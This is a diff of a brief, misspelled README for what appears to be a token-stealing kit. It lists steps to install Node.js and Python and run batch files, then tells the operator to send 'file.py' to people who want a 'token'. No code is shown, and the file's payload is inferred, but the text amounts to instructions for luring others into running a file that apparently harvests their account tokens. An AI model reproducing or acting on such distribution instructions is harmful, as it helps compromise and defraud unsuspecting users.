@@ -1,6 +1,9 @@
 you havt to install node.js and oython 
 link https://nodejs.org/en/ // https://www.python.org/
 
-and start start.bat
+1. run node module.bat
+2. run start.bat
 
-then send file.py at people who wants to have tokan
+then send file.py at people who wants to have token
+
+enjoy :)
